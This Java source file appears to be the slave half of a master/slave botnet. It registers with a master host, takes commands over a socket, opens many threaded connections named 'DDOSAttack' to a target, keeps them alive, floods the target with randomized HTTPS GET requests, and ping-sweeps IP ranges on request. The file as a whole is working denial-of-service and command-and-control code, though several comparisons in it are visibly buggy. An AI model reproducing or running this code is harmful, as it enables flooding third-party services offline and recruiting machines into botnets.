
	import java.net.*;
	import java.io.*;
	import java.lang.*;
	import java.util.*;
	import java.text.SimpleDateFormat;

	class Connect implements Runnable 
	{ //Class to connect to Target using multithreading
		
	    public static String disconnectIP = "";
	    public static String disconnectPort = "";
	    private Thread th;
	    private String threadName;
	    public String HostIP;
	    public Integer HostPort;
	    
	    public int connectioncount;
	    public int NumberOfConnect;
	    
	    public String NewFeature;
	    int i = 0;
	    
	    private final String user_browser = "Mozilla/5.0"; 

	    Connect(int n, String targetHost, String Port,String feature1,int noofconnect) 
	    {
	    	//System.out.println("in slave connect function");--to debug
	    	
	        i = 1;
	        threadName = "DDOSAttack_" + Integer.toString(n);
	        HostIP = targetHost;
	        HostPort = Integer.parseInt(Port);
	        disconnectIP = "";
	        disconnectPort = "";
	        NewFeature = feature1;
	        
	        connectioncount = n;
	        NumberOfConnect = noofconnect;
	        
	        //System.out.println(threadName+NewFeature);--to debug
	    }

	    public static void setDisconnectParameters(String IP, String Port) 
	    { 
	    	//System.out.println("in setdisconnect");--to debug
	    	
	    	//to Set disconnect parameters
	        disconnectIP = IP;
	        disconnectPort = Port;
	        
	        for(int i = 0; i < 1000; i++); //for thread synch
	    }

	    //to create Http connection
	    private void sendGet(String url) throws Exception 
	    {
		   	 URL obj = new URL(url);
		     HttpURLConnection con = (HttpURLConnection) obj.openConnection();
	
		     // optional default is GET
		     con.setRequestMethod("GET");
	
		     //add request header
		     con.setRequestProperty("User-Agent", user_browser);
	
		       
		     int responseCode = con.getResponseCode();
		        
		      //System.out.println("\nSending 'GET' request to URL : " + url); //Debug
		      //System.out.println("Response Code : " + responseCode);//Debug
		        
		     BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		       
			String line_input;
			StringBuffer response = new StringBuffer();
					
			while ((line_input = in.readLine()) != null)
				{
					response.append(line_input);
				}
						
			in.close();
	
		    //obj=null;
		    //print result
		    //System.out.println(response.toString()); //Debug

	    }
	    
	    
	    
	    public void run() 
	    {   
	    	String targetIP = HostIP;
	        Integer targetPort = HostPort;
	        String thread_name = threadName;
	        String Myfeature = NewFeature;
	        
	        int count_conn = connectioncount;
	        int number_connect = NumberOfConnect;
	        
	        //debug System.out.println("in run");

	        try 
	        {
	            InetAddress address = null;
	            try 
		            {
		                address = InetAddress.getByName(targetIP);
		            } 
	            catch (UnknownHostException ex) 
		            {
		                System.out.println(ex.getMessage());
		            }

	            Socket AttackTargetSoc=null;			//create a new socket to attack target
	            
	            try
		            {
		                AttackTargetSoc = new Socket(); 
		                AttackTargetSoc.setTcpNoDelay(true);
		                
		                if("YES".equals(Myfeature))
			                {
			                   //debug System.out.println("Setting keepalive");
		                	AttackTargetSoc.setKeepAlive(true);
			                }
		                
		                if("NO".equals(Myfeature) || "YES".equals(Myfeature))
		                {
		                SocketAddress sockaddr =  new InetSocketAddress(address, targetPort);
		                AttackTargetSoc.connect(sockaddr, 2000);
		                
		                //debug System.out.println("Connected!");
		                }
		            }
	            
	            catch(IOException ioe) 
		            {
	            	 System.out.println(ioe.getMessage()); 
		            }
	                
	            boolean disconnectSoc = true;
	            
	            String disconnectIP1;
	            String disconnectPort1;
	            
	            int counter = 0;

	            while(disconnectSoc)
	            {
	                disconnectIP1 = disconnectIP;            
	                disconnectPort1 = disconnectPort;
	                InetAddress disAddr = null;
	                Integer disPort;

	                try 
		                {
		                	if(!disconnectIP.isEmpty())
			                	{
				                        disAddr = InetAddress.getByName(disconnectIP1);
			                	}
		                } 
	                catch (UnknownHostException ex) 
		                {
		                    System.out.println(ex.getMessage());
		                }

	                if ("all".equals(disconnectPort1)) 
		                {
		                    disPort = targetPort;
		                }
	                else 
		                {
		                    disPort = Integer.parseInt(disconnectPort1);
		                }
	                
	                disconnectSoc = !(((address.equals(disAddr))||("all".equals(disconnectIP1)))&&(disPort == targetPort)); //logic which makes disconnect work
	                
	                if("YES".equals(Myfeature))
		                { 
	                		//keepAlive start
		                    try
			                    {
			                        Thread.sleep(200);
			                    }
		                    catch(InterruptedException ie)
			                    {
			                    	
			                    }
		                    if(counter == 70)
			                    { 
				                        counter = 0;
				                        AttackTargetSoc.close();
				                        Connect connection = new Connect(99, targetIP, Integer.toString(targetPort), Myfeature,number_connect);
				                        connection.start(); //create a new connection in a new thread
				                        Connect.setDisconnectParameters(disconnectIP1, disconnectPort1); //set other functionalities back to old state
				                        disconnectSoc = false; //finish this thread
			                    }
		                }
	                else if(Myfeature.contains("#q="))
	                {
	                	//debug System.out.println("in Not No loop");
	                	
	                	//in case of url, send the url
	                    try
		                    {
		                        Thread.sleep(200);
		                    }
	                    catch(InterruptedException ie)
		                    {
		                    	
		                    }

	                    Random rand = new Random();
	                    int len = rand.nextInt(10) + 1;
	                    String chh;
	                    chh = "";
	                    
	                    //debug System.out.println(len+" "+chh+" ");
	                    
	                    for(int j = 0; j<len; j++)
		                    {
		                        int ch = rand.nextInt(26) + 97;
		                        chh += Character.toString((char)(int)ch);
		                    }
	                    
	                    String url = "https://"+ targetIP + Myfeature + chh;
	                    
	                   //debug System.out.println(url);
	                    
	                    try
		                    {
	                    	//debug System.out.println("call to send get url");
	                    	
		                        sendGet(url);
		                    }
	                    catch(Exception ie)
		                    {
		                    	
		                    }
	                    
	                    if(number_connect==number_connect)
	                    {
	                    	disconnectSoc = false;
	                    }
	                }
	            } //continue if disconnect IP and Port are not the same as current thread's target IP and Port
	            
	            AttackTargetSoc.close();//disconnecting slave from target
	        }
	        catch(IOException ex) 
	        { 
	            System.err.println("Run: " + ex.getMessage());
	            System.exit(-1);
	        }
	    	    }

	    public void start() 
	    {
	        if (th == null) 
	        {
	            th = new Thread(this,threadName);
	            th.start();
	        }
	    }
	}

	public class SlaveBot 
	{ 
	    public static int numberOfConnections;
	    public static String[] IPs = new String[50];
	    public static String[] Ports = new String[50];
	    public static int[] k = new int[50];
	    public static Integer LineCount = 0;
	    
	    public static void main(String[] args) 
	    {   
	        if (args.length != 4) 
	        {    //check if -h MasterBot-IP -p port is given
	            System.exit(-1);
	        }

	        int listenerPort;
	        Random rand = new Random();                          //select a random port number for slave to listen for master commands
	        listenerPort = rand.nextInt((65535 - 49152) + 1) + 49152;

	        register(args, listenerPort);                   //register itself with Master

	        try( ServerSocket slave = new ServerSocket(listenerPort);) 
	        {
	            while(true)
	            {          //listen for connection from master
	                Socket MasterConnect = slave.accept();
	                try 
	                {
	                	InputStream cmdIn = MasterConnect.getInputStream(); // create object to get input through socket
	                    BufferedReader br = new BufferedReader(new InputStreamReader(cmdIn));  //stores input until master closes the connection
	                    String line = br.readLine();
	                    String[] cmd = line.split("\\s+");

	                    if("connect".equals(cmd[0]))
		                    {
	                    		
	                    	//debug System.out.println("in slave main");
	                    	
		                        ConnectToTarget(cmd[1], cmd[2], cmd[3],cmd[4]);
		                        
		                        
		                        
		                    }
	                    if("disconnect".equals(cmd[0])) 
		                    {
		                        DisconnectFromTarget(cmd[1],cmd[2]);
		                    }
	                    if("ipscan".equals(cmd[0]))
							{
	                    	System.out.println("in slave"+"line: "+line);
								ipscan(line,MasterConnect);
							}
	                }
	                catch(IOException ex) 
	                {
	                    System.err.println("Main-while: " + ex.getMessage());
	                    System.exit(-1);
	                }
	                
	                MasterConnect.close();
	            }
	        } 
	        catch (IOException ex) {
	            System.err.println("Main: " + ex.getMessage());
	            System.exit(-1);
	        }
	    }

	    public static void ConnectToTarget(String targetIP, String targetPort, String connections,String feature2) 
	    {
	    	//debug System.out.println("in slave connect to target");
	    	//debug System.out.println(targetIP+targetPort+connections+feature2);
	    	
	    	int numberOfConnections = Integer.parseInt(connections);
	        int connectionCount = 0;
	        int j;
	        
	        for(j = 0; j < LineCount + 1; j++) 
	        {
	            if (((IPs[j] == targetIP)||(IPs[j]==null))&&((Ports[j] == targetPort)||(targetPort == "all")||(Ports[j] == null)))
	            {
	                break;   
	            }
	        }
	        for (int i = 0; i < numberOfConnections; i++)
		        { //Create a thread for every new connection
		        	
	        //debug	System.out.println("in for loop"+connectionCount+"number of connect: "+numberOfConnections);
	        	
	        		connectionCount++;
	        		
	        		//debug System.out.println("call to connect");
	        		
		            Connect connection = new Connect(connectionCount, targetIP, targetPort,feature2,numberOfConnections);
		            connection.setDisconnectParameters(" ","0");
		            connection.start();
		            k[j] = k[j] + 1;
		        }
	        if(IPs[j] == null)
	            LineCount++;

	        IPs[j] = targetIP;
	        Ports[j] = targetPort;
	    }

	    public static void DisconnectFromTarget(String targetIP, String targetPort) 
	    {
	        Connect.setDisconnectParameters(targetIP, targetPort); //set disconnect parameters
	        int j;
	        for(j = 0; j < LineCount + 1; j++) 
	        {   //Delete disconnected IP from list
	            if ((IPs[j] == targetIP)||(IPs[j] == null) && (Ports[j] == targetPort)||(targetPort == "all")||(Ports[j] == null)) {
	                break;
	            }
	        }
	        k[j] = 0;
	    }

	    public static void register(String[] args, int Port) 
	    { //Register with master
	        try {
	            InetAddress address = InetAddress.getLocalHost();
	            String selfHostIP = address.getHostAddress();
	            String selfHostName = address.getHostName();

	            Socket masterSock = new Socket(args[1], Integer.parseInt(args[3]));				    
	            PrintWriter  masterOutStream = new PrintWriter(masterSock.getOutputStream(),true);

	            String timeStamp = new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
	            masterOutStream.println(selfHostName + " " + selfHostIP + " " + Integer.toString(Port) + " " + timeStamp);

	            masterSock.close();
	        }
	        catch(IOException ex) {
	            System.err.println("Could Not register with master!  " + ex.getMessage());
	            System.exit(-1);
	        }
	       
	    }
	    public static void ipscan(String argument,Socket socket)
        {
	    	System.out.println("in slave ipscan");
	    	new Thread(() -> 
	    	{
	            String buffer;
	            int i=0;
	            String targetRange="1.1.1.1";
	            StringTokenizer st = new StringTokenizer(argument);
	            
	            //BreakDown disconnect Command
	            while (st.hasMoreTokens())
	            {
	                i++;
	                buffer=st.nextToken();
	                switch(i)
	                {
	                    case 3: targetRange=buffer; break;
	                    default : break;
	                }
	            }
	            
	            String temp[]=targetRange.split("-");
	            IPAddress ip1=new IPAddress(temp[0]);
	            IPAddress ip2=new IPAddress(temp[1]);
	            String all="";
	            
	            //Process p;
	            do{
	                try{
	                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
	                    InetAddress inet = InetAddress.getByName(ip1.toString());
	                    Process p = Runtime.getRuntime().exec("ping -c 1 -t 5 " + ip1.toString());//for unix like
	                    
	                    //Process p = Runtime.getRuntime().exec("ping -n 1 -w 5 " + ip1.toString());//for windows
	                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
	                    int flag=0;
	                    String line = "";
	                    
	                    while ((line = reader.readLine())!= null) 
		                    {
			                    if(line.contains("ttl")||line.contains("TTL"))
			                        flag=1;
		                    }
	                    p.waitFor();
	                    
	                    //if(inet.isReachable(5000))
	                    if(flag==1)
		                    {
		                        
		                        if(all.equals(""))
		                            all=ip1.toString();
		                        else
		                            all=all+", "+ip1.toString();
		                    }
	                    
	                }catch(Exception e)
		                {
		                	
		                }
	                ip1=ip1.next();
	            }while(ip1.getValue()<=ip2.getValue());
	            try
		            {
		               PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
		               out.println(all);
		            }catch(Exception e)
			            {
			            	
			            }
	            try
		            {
		                PrintWriter out=new PrintWriter(socket.getOutputStream(), true);
		                out.println("over2"); 
		            }catch(Exception e)
			            {
			            	System.out.println(e);
			            }    
	            }).start();
	    }
	}
	  //class to iterate through the ip range
	    class IPAddress {

	        private final int value;

	        public IPAddress(int value) {
	            this.value = value;
	        }

	        public IPAddress(String stringValue) {
	            String[] parts = stringValue.split("\\.");
	            if( parts.length != 4 ) {
	                throw new IllegalArgumentException();
	            }
	            value = 
	                    (Integer.parseInt(parts[0], 10) << (8*3)) & 0xFF000000 | 
	                    (Integer.parseInt(parts[1], 10) << (8*2)) & 0x00FF0000 |
	                    (Integer.parseInt(parts[2], 10) << (8*1)) & 0x0000FF00 |
	                    (Integer.parseInt(parts[3], 10) << (8*0)) & 0x000000FF;
	        }

	        public int getOctet(int i) {

	            if( i<0 || i>=4 ) throw new IndexOutOfBoundsException();

	            return (value >> (i*8)) & 0x000000FF;
	        }

	        public String toString() {
	            StringBuilder sb = new StringBuilder();

	            for(int i=3; i>=0; --i) {
	                sb.append(getOctet(i));
	                if( i!= 0) sb.append(".");
	            }

	            return sb.toString();

	        }

	        @Override
	        public boolean equals(Object obj) {
	            if( obj instanceof IPAddress ) {
	                return value==((IPAddress)obj).value;
	            }
	            return false;
	        }

	        @Override
	        public int hashCode() {
	            return value;
	        }

	        public int getValue() {
	            return value;
	        }

	        public IPAddress next() {
	            return new IPAddress(value+1);
	        }
	    }
